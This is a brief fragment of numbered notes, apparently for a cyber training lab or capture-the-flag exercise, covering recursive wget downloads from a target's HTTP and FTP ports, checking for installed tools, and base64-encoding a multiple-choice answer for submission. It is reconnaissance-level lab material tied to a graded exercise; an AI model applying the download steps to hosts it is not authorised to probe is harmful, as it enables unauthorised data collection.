4. For port 80/21
		wget -r http://ip-address
		wget -r ftp://ip-address
		
		if you see hint-02a.png (means that it corresponds to box number 2)
5. cd /user/share/cctc
6. if you need a tool, you can run `where is [tool]` to see if the tool is installed. `which`
7. If you see a multiple choice question, 
8. echo "C" | base64 -> Converts an answer to base64....